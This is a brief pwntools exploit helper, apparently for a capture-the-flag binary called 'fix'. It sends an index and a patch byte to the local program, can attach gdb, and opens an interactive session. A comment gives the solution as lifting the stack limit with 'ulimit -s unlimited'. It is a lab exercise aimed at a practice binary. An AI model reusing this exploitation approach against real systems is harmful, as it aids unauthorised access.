from pwn import *
import argh


'''
this is a stupid challenge. the point in the end is to do ulimit -s unlimited. this enables the stack to be any size.
'''


context.log_level = 'debug'


gdbscript = '''
    layout regs
    # display/6wx 0x804a02c
    display/8wx $esp
    break *0x8048552
    c
'''


@argh.arg('index', choices=range(0, 23))
@argh.arg('byte')
@argh.arg('-d', '--debug')
def main(index, byte, debug=False):
    byte = int(byte, base=16)
    bin_name = './fix'
    p = None

    if debug:
        p = gdb.debug(bin_name, gdbscript)
    else:
        p = process(bin_name)

    p.recvlines(3)
    # p.recvuntil('be fixed : ')
    p.sendline(str(index))
    # p.recvline('be patched : ')
    p.sendline(str(byte))

    p.interactive()


if __name__ == '__main__':
    argh.dispatch_command(main)

